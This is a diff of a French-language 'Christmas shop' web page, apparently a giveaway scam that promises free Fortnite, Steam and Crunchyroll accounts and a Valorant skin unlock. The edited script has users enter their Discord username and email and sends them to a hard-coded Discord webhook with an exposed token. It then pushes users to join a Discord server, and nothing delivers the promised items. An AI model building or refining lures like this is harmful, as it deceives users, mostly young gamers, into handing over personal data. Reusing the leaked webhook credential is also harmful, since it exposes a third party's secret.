@@ -72,23 +72,23 @@
         <h1>Boutique de Noël 🎄🎁</h1>
         <div class="products">
             <div class="product">
-                <h2>Compte Crunchyroll</h2>
-                <p>Tout vos anime sans pub.</p>
-                <button onclick="selectProduct('Compte Crunchyroll')">Choisir ce produit</button>
-            </div>
-            <div class="product">
-                <h2>Compte Fortnite</h2>
-                <p>Compte Fn avec une chance de gagner des skin rare.</p>
+                <h2>🎮 Compte Fortnite</h2>
+                <p>Un compte Fortnite avec des skins exclusifs.</p>
                 <button onclick="selectProduct('Compte Fortnite')">Choisir ce produit</button>
             </div>
             <div class="product">
-                <h2>Compte Steam</h2>
-                <p>Compte Steam avec une chance de gagner des jeux chere !</p>
+                <h2>📺 Compte Crunchyroll Premium</h2>
+                <p>Accès complet à des anime en haute qualité et sans pub.</p>
+                <button onclick="selectProduct('Compte Crunchyroll Premium')">Choisir ce produit</button>
+            </div>
+            <div class="product">
+                <h2>🎮 Compte Steam</h2>
+                <p>Un compte Steam avec des jeux populaires.</p>
                 <button onclick="selectProduct('Compte Steam')">Choisir ce produit</button>
             </div>
             <div class="product">
-                <h2>Unlock all Valo</h2>
-                <p>Une exclu qui reste uniquement aujourd'hui.</p>
+                <h2>🔓 Unlock all Valo</h2>
+                <p>Accès à tout les Skins de Valorant.</p>
                 <button onclick="selectProduct('Unlock all Valo')">Choisir ce produit</button>
             </div>
         </div>
@@ -101,6 +101,12 @@
     </div>
 
     <div class="container" id="confirmationContainer" style="display: none;">
+        <h1>Rejoignez notre serveur Discord 🎅</h1>
+        <p>Pour recevoir votre cadeau, veuillez rejoindre notre serveur Discord en cliquant sur le lien ci-dessous :</p>
+        <a href="https://discord.gg/xdk6Uszrt6" id="joinDiscord" target="_blank">Rejoindre le serveur Discord</a>
+    </div>
+
+    <div class="container" id="finalContainer" style="display: none;">
         <h1>Commande en cours 🎅</h1>
         <p>🎁 Attendez environ 24h pour recevoir votre cadeau par email ! 🎁</p>
     </div>
@@ -114,14 +120,19 @@
 
         document.getElementById('giftForm').addEventListener('submit', function(event) {
             event.preventDefault();
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('confirmationContainer').style.display = 'block';
+        });
+
+        document.getElementById('joinDiscord').addEventListener('click', function() {
             const product = document.getElementById('product').value;
             const discordUsername = document.getElementById('discordUsername').value;
             const email = document.getElementById('email').value;
 
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd'; 
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1321945888171753542/WfClK3T35-yKtzSEACLVKQvHZa_cqyAGL6GhY0-B0cLYizYrpBfGk36EZtYmQ_8itpYd'; /* Remplacez par votre URL de webhook Discord */
 
             const data = {
-                content: `Nouveau formulaire soumis !\n🎁 Produit: ${product}\n🎄 Pseudo Discord: ${discordUsername}\n🎅 Email: ${email}`
+                content: `Nouvel utilisateur a rejoint le serveur !\n🎁 Produit: ${product}\n🎄 Pseudo Discord: ${discordUsername}\n🎅 Email: ${email}`
             };
 
             fetch(webhookUrl, {
@@ -133,15 +144,14 @@
             })
             .then(response => {
                 if (response.ok) {
-                    document.getElementById('formContainer').style.display = 'none';
-                    document.getElementById('confirmationContainer').style.display = 'block';
+                    document.getElementById('confirmationContainer').style.display = 'none';
+                    document.getElementById('finalContainer').style.display = 'block';
                 } else {
                     alert('Erreur lors de la soumission du formulaire.');
                 }
             })
             .catch(error => {
                 console.error('Erreur:', error);
-                alert('Erreur lors de la soumission du formulaire.');
             });
         });
     </script>
